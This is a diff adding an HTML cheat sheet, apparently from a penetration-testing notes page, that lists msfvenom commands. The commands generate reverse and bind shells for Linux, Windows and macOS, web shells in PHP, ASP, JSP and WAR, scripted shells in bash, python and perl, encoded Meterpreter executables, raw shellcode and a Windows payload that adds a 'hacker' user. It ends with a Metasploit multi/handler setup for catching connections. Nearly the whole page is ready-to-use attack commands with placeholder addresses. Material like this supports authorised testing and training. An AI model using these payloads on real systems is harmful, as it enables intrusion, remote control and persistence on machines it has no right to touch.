@@ -1,0 +1,84 @@
+<h2 id="list-payloads">List payloads</h2>
+<hr />
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -l
+</code></pre></div></div>
+
+<h2 id="binaries-payloads">Binaries Payloads</h2>
+<hr />
+
+<h4 id="-linux-meterpreter-reverse-shell">| Linux Meterpreter Reverse Shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; shell.elf
+</code></pre></div></div>
+<h4 id="-linux-bind-meterpreter-shell">| Linux Bind Meterpreter Shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; bind.elf
+</code></pre></div></div>
+<h4 id="-linux-bind-shell">| Linux Bind Shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p generic/shell_bind_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; term.elf
+</code></pre></div></div>
+<h4 id="-windows-meterpreter-reverse-tcp-shell">| Windows Meterpreter Reverse TCP Shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f exe &gt; shell.exe
+</code></pre></div></div>
+<h4 id="-windows-reverse-tcp-shell">| Windows Reverse TCP Shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/shell/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f exe &gt; shell.exe
+</code></pre></div></div>
+<h4 id="-windows-encoded-meterpreter-windows-reverse-shell">| Windows Encoded Meterpreter Windows Reverse Shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe &gt; encoded.exe
+</code></pre></div></div>
+<h4 id="-mac-reverse-shell">| Mac Reverse Shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f macho &gt; shell.macho
+</code></pre></div></div>
+<h4 id="-mac-bind-shell">| Mac Bind Shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p osx/x86/shell_bind_tcp RHOST=&lt;Remote IP Address&gt; LPORT=&lt;Local Port&gt; -f macho &gt; bind.macho
+</code></pre></div></div>
+<h1 id="web-payloads">Web Payloads</h1>
+<hr />
+<h4 id="-php-meterpreter-reverse-tcp">| PHP Meterpreter Reverse TCP</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.php
+cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php
+</code></pre></div></div>
+<h4 id="-asp-meterpreter-reverse-tcp">| ASP Meterpreter Reverse TCP</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f asp &gt; shell.asp
+</code></pre></div></div>
+<h4 id="-jsp-java-meterpreter-reverse-tcp">| JSP Java Meterpreter Reverse TCP</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.jsp
+</code></pre></div></div>
+<h4 id="-war">| WAR</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f war &gt; shell.war
+</code></pre></div></div>
+<h1 id="scripting-payloads">Scripting Payloads</h1>
+<hr />
+<h4 id="-python-reverse-shell">| Python Reverse Shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.py
+</code></pre></div></div>
+<h4 id="-bash-unix-reverse-shell">| Bash Unix Reverse Shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.sh
+</code></pre></div></div>
+<h4 id="-perl-unix-reverse-shell">| Perl Unix Reverse shell</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f raw &gt; shell.pl
+</code></pre></div></div>
+
+<h1 id="shellcode">Shellcode</h1>
+<hr />
+
+<h4 id="-windows-meterpreter-reverse-tcp-shellcode">| Windows Meterpreter Reverse TCP Shellcode</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;
+</code></pre></div></div>
+<h4 id="-linux-meterpreter-reverse-tcp-shellcode">| Linux Meterpreter Reverse TCP Shellcode</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;
+</code></pre></div></div>
+<h4 id="-mac-reverse-tcp-shellcode">| Mac Reverse TCP Shellcode</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f &lt;language&gt;
+</code></pre></div></div>
+<h4 id="-create-user">| Create User</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe &gt; adduser.exe
+</code></pre></div></div>
+
+<h1 id="metasploit-handler">Metasploit Handler</h1>
+<hr />
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+set PAYLOAD &lt;Payload name&gt;
+Set RHOST &lt;Remote IP&gt;
+set LHOST &lt;Local IP&gt;
+set LPORT &lt;Local Port&gt;
+Run
+</code></pre></div></div>
